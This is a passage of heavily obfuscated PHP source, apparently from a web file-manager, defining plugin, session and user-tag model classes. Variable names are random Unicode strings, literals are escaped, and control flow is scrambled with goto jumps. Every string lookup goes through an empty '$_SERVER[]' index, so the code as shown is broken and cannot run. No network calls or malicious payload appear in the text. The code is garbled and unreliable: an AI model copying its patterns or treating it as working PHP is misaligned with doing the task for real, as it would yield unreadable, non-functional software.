$_SERVER[]; if (!$this->getByTagID($DƖ, $f푄) || !$bӞ) { return !1; } if (is_array($bӞ)) { $bӞ = array($D[7], $bӞ); } $Cꉩ = array($D[1525] => 0, $D[463] => $f푄, $D[415] => $D[1811] . $DƖ, $D[414] => $bӞ); return $this->where($Cꉩ)->delete(); } protected function removeByTag($Eք, $dתо) { $Cއ =& $_SERVER[]; if (!$this->getByTagID($Eք, $dתо)) { return !1; } $c = array($Cއ[1525] => 0, $Cއ[463] => $dתо, $Cއ[415] => $Cއ[1811] . $Eք); return $this->where($c)->delete(); } protected function removeBySource($c亓, $eݙ) { $e屃 =& $_SERVER[]; if (!$c亓 || !$eݙ) { return !1; } if (is_array($eݙ)) { $eݙ = array($e屃[7], $eݙ); } $A = array($e屃[1525] => 0, $e屃[414] => $eݙ, $e屃[463] => array($e屃[978], 0), $e屃[415] => $e屃[1811] . $c亓); return $this->where($A)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x70\154\165\147\151\x6e\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\x61\164\165\163", "\162\x65\147\x69\145\163\x74", "\x63\x6f\x6e\x66\x69\x67"); public function loadList($aե = false) { $CԈ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($aե) { return $CԈ[$aե]; } return $CԈ; } public function init() { $dÙ =& $_SERVER[]; Hook::trigger($dÙ[1812]); $Bۉ = $this->loadPluginList(); foreach ($Bۉ as $bփЍ => $fъ) { $Aƭ = $this->appAllow($bփЍ, $fъ); if (!$Aƭ) { continue; } foreach ($fъ[$dÙ[1813]] as $eǊ => $Cˢݳ) { Hook::bind($eǊ, $Cˢݳ); } } Hook::trigger($dÙ[1814]); Hook::trigger(ACTION); } public function appAllow($FƯ, $BҶ, $Dڗ = true) { $Cӷϖ =& $_SERVER[]; $bي֋ = PLUGIN_DIR . $FƯ . $Cӷϖ[1815]; if (!is_array($BҶ) || !is_array($BҶ[$Cӷϖ[1813]]) || $BҶ[$Cӷϖ[716]] != 1 || !is_file($bي֋)) { return !1; } if ($GLOBALS[$Cӷϖ[485]] == 1) { return !0; } if ($Dڗ && !Action($Cӷϖ[1816])->checkAuth($FƯ)) { return !1; } return !0; } public function unInstall($BǕ) { $a觳č =& $_SERVER[]; $eټ = $this->loadList($BǕ); if (file_exists(PLUGIN_DIR . $BǕ)) { Hook::apply($BǕ . $a觳č[1817]); } $this->remove($eټ[$a觳č[393]]); } public function changeStatus($dֆ, $dϫǎ) { $D =& $_SERVER[]; $DӇ = $this->loadList($dֆ); if ($dϫǎ) { Hook::apply($dֆ . $D[1818]); } $this->update($DӇ[$D[393]], array($D[1819] => $dϫǎ)); } public function appRegist($Aޏ, $Eڊ) { $EȈ =& $_SERVER[]; $c툚 = $this->loadList($Aޏ); if ($c툚) { $this->update($c툚[$EȈ[393]], array($EȈ[1813] => $Eڊ)); } else { $fӎ = array($EȈ[28] => $Aޏ, $EȈ[1813] => $Eڊ, $EȈ[716] => 0, $EȈ[6] => $this->getConfigDefault($Aޏ)); $this->insert($fӎ); } } public function getConfigDefault($C) { $dήÇ =& $_SERVER[]; $E谭 = array(); $CὛ = $this->getPackageJson($C); if (!$CὛ && is_array($CὛ[$dήÇ[1820]])) { return $E谭; } foreach ($CὛ[$dήÇ[1820]] as $c̐ => $fε) { if (!isset($fε[$dήÇ[372]]) || isset($E谭[$c̐])) { continue; } $E谭[$c̐] = $fε[$dήÇ[372]]; } return $E谭; } public function getPackageJson($Eۑ) { return Hook::apply($Eۑ . $_SERVER[][1821]); } public function getConfig($E􍿏, $A = false) { $Dʦ =& $_SERVER[]; $Fж = array(); $A񭉥 = $this->loadList($E􍿏); if ($A񭉥 && is_array($A񭉥[$Dʦ[6]])) { $Fж = $A񭉥[$Dʦ[6]]; } if (!$Fж || $A) { $Fж = $this->getConfigDefault($E􍿏); } return $Fж; } public function setConfig($A膃, $a = false) { goto d̈Ƙ; cЅƪ: $c = $fĒ[$ẽą[6]]; if ($a == !1) { $c = array(); $a = $this->getConfigDefault($A膃); } foreach ($a as $dꖄ => $C۳) { $c[$dꖄ] = is_string($C۳) ? trim($C۳) : $C۳; } goto EҲ; EҲ: $this->update($fĒ[$ẽą[393]], array($ẽą[6] => $c)); goto Dʔ; d̈Ƙ: $ẽą =& $_SERVER[]; $fĒ = $this->loadList($A膃); if (!$fĒ) { return !1; } goto cЅƪ; Dʔ: } public function viewList() { goto BơЧ; BơЧ: $aȻǦ =& $_SERVER[]; $eྛ = $this->loadList(); $this->pluginScan($eྛ); goto AѶԍ; AѶԍ: $eྛ = $this->loadPluginList(); $D = array(); foreach ($eྛ as $b鉙 => $bݞ) { unset($bݞ[$aȻǦ[1813]], $bݞ[$aȻǦ[6]]); $C = PLUGIN_DIR . $bݞ[$aȻǦ[28]] . $aȻǦ[1815]; if (!is_file($C)) { continue; } $d񖪓Ȇ = Hook::apply($bݞ[$aȻǦ[28]] . $aȻǦ[1821]); if (is_array($d񖪓Ȇ)) { $D[$b鉙] = array_merge($bݞ, $d񖪓Ȇ); } } goto e֪˘; e֪˘: return $D; goto dɪ։; dɪ։: } private function loadPluginList() { $dŊ =& $_SERVER[]; $bԡ = $this->loadList(); if (strtolower(MOD) == $dŊ[1822]) { return $bԡ; } $eو = Hook::trigger($dŊ[1823], $bԡ); if ($bԡ && !$eو) { die; } return $eو ? $eو : $bԡ; } private function pluginScan($b) { $dР =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $Fͭ, $aɆ, 0); foreach ($Fͭ as $c) { $a񵖱٦ = get_path_this($c); if (isset($b[$a񵖱٦]) || !file_exists($c . $dР[1824]) || !file_exists($c . $dР[1815])) { continue; } Hook::apply($a񵖱٦ . $dР[1818]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\x73\145\163\x73\151\157\156"; public function get($f) { $a =& $_SERVER[]; $bϤƑ = $this->where(array($a[1825] => $f))->find(); if (!is_array($bϤƑ)) { return !1; } return $bϤƑ[$a[721]]; } public function set($e, $Bס뗔, $Cл = 3600) { $bԆ =& $_SERVER[]; $Cϰ = array($bԆ[1825] => $e, $bԆ[1734] => $Bס뗔, $bԆ[1826] => $Cл + time()); if (Session::get($bԆ[1827])) { $Cϰ[$bԆ[1533]] = Session::get($bԆ[1827]); } else { $Cϰ[$bԆ[1533]] = 0; } if ($this->get($e)) { return $this->where(array($bԆ[1825] => $e))->save($Cϰ); } else { return $this->add($Cϰ, array(), !0); } } public function remove($d) { return $this->where(array($_SERVER[][1825] => $d))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][1828] . time())->delete(); } } goto aټ; aϘ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($A⚅) { $eȦћ =& $_SERVER[]; return array($eȦћ[1803] => array(USER_ID, $eȦћ[1804])); } protected function listData() { $CҚ =& $_SERVER[]; $E = array($CҚ[1525] => USER_ID, $CҚ[463] => array($CҚ[1807], 0)); $eύ = $CҚ[1809]; $F = $this->field($eύ)->where($E)->order($CҚ[1810])->select(); return $F ? $F : array(); } protected function listByTag($c󒓓) { } protected function addToTag($A¥, $A) { $bΫ =& $_SERVER[]; if (!Model($bΫ[1945])->listData($A) || !Model($bΫ[796])->pathInfo($A¥)) { return !1; } $aς = array($bΫ[1525] => USER_ID, $bΫ[463] => $A, $bΫ[414] => $A¥, $bΫ[415] => $bΫ[409], $bΫ[413] => $bΫ[33], $bΫ[1705] => 0); if ($this->where($aς)->find()) { return !1; } return $this->add($aς); } protected function removeFromTag($E՗, $a) { $dƽʻ =& $_SERVER[]; if (!Model($dƽʻ[1945])->listData($a)) { return !1; } if (is_array($E՗)) { $E՗ = array($dƽʻ[7], $E՗); } $F弐և = array($dƽʻ[1525] => USER_ID, $dƽʻ[463] => $a, $dƽʻ[415] => $dƽʻ[409], $dƽʻ[414] => $E՗); return $this->where($F弐և)->delete(); } protected function removeByTag($aːҭ) { $Dͣ =& $_SERVER[]; if (!$aːҭ) { return !1; } $B = array($Dͣ[1525] => USER_ID, $Dͣ[463] => $aːҭ); return $this->where($B)->delete(); } protected function removeBySource($D) { $cݍؾ =& $_SERVER[]; if (is_array($D)) { $D = array($cݍؾ[7], $D); } $E񇿐 = array($cݍؾ[1525] => USER_ID, $cݍؾ[414] => $D, $cݍؾ[463] => array($cݍؾ[978], 0)); return $this->where($E񇿐)->delete(); } }